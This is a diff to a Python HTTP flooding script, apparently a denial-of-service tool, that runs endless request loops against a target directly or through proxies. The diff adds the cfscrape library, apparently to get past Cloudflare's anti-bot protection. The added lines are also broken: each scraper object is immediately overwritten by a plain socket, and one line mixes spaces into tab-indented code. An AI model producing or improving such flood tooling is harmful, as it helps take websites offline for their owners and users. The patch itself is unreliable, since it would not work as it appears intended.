@@ -2,6 +2,7 @@ import socket
 import socks
 import threading
 import time
+import cfscrape
 import random
 import re
 import urllib.request
@@ -710,6 +711,7 @@ def loop():
 	global threads
 	global acceptall
 	global connection
+        global cfscrape
 	global go
 	global x
 	
@@ -776,6 +778,7 @@ class RequestProxyHTTP(threading.Thread):
 		go.wait() # aspetta che i threads siano pronti
 		while True: # ciclo infinito
 			try:
+				s = cfscrape.create_scraper()
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(request))
@@ -807,6 +810,7 @@ class RequestDefaultHTTP(threading.Thread):
 		go.wait() 
 		while True:
 			try:
+				s = cfscrape.create_scraper()
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2), int(urlport))) 
 				s.send (str.encode(request))
